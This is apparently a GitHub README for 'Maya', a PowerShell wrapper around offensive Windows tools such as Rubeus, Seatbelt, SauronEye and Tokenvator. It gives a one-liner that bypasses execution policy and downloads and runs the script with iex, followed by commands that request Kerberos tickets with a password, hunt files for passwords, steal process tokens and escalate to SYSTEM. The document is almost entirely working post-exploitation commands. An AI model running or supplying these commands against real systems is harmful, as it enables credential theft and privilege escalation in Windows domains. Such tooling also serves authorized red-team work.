# Maya
*Non Powershell based tools wrapped in PowerShell!*

Import-Module ./Maya.ps1

Maya

IEX:

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Maya/main/Maya.ps1'))

###################################

Follow the on screen instructions:
e.g.

Maya -Rubeus -Command "klist"

Maya -Rubeus -Command "asktgt /user:MNDC /password:ComputerPassword /domain:mitnick.in /dc:MNDC.mitnick.in /nowrap"

Maya -Seatbelt -Command "-group=user"

Maya -grouper2 -Command "-Path c:\Temp\gporeport.xml"

Maya -SauronEye -Command "--filetypes .xml .txt .doc .docx .xls .ps1 --keywords pass"

Maya -Tokenvator

Maya -Tokenvator -Command "Sample_Processes"

Maya -Tokenvator -Command "Steal_Token 1156 cmd.exe"

Maya -Tokenvator -Command "GetSystem"

Maya -Tokenvator -Command "WhoAmI"

Maya -Tokenvator -Command "info"

Maya -Rubeus -Command "klist"

Get-GPOReport -All -ReportType XML -Path "c:\Temp\gporeport.xml"

Then,
Maya -grouper2 -Command "-Path c:\Temp\gporeport.xml"
